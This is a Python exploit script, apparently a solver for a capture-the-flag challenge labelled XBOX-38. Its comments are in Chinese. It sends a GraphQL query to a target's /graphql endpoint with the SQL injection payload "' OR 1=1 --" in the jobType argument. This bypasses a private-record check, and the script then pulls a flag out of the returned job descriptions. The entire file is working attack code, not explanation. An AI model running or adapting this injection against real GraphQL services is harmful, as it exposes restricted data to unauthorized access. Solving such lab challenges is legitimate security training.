# coding:utf-8
import requests
import re
import sys

"""
@文件命名：XBOX-38
@使用方式: python 038.py url
@简述思路: 利用 GraphQL jobType 参数 SQL 注入，绕过 private 检查，获取 flag
"""


def Scan(url):
    flag = ""
    try:
        # 格式化 url，确保以 /graphql 结尾
        if not url.endswith("/graphql"):
            if url.endswith("/"):
                url += "graphql"
            else:
                url += "/graphql"
        payload = "' OR 1=1 --"
        graphql_query = {
            "query": f"""
            query {{
                jobs(jobType: "{payload}") {{
                    id
                    name
                    type
                    description
                }}
            }}
            """
        }
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, headers=headers, json=graphql_query, timeout=10)
        if response.status_code == 200:
            result = response.json()
            jobs = result.get("data", {}).get("jobs", [])
            for job in jobs:
                if job.get("type") == "private":
                    desc = job.get("description", "")
                    match = re.search(r"(flag|FLAG)\{.*?\}", desc)
                    if match:
                        flag = match.group(0)
                        break
        else:
            print(f"请求失败，状态码: {response.status_code}")
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python 038.py url")
    else:
        print(Scan(url=sys.argv[1]))
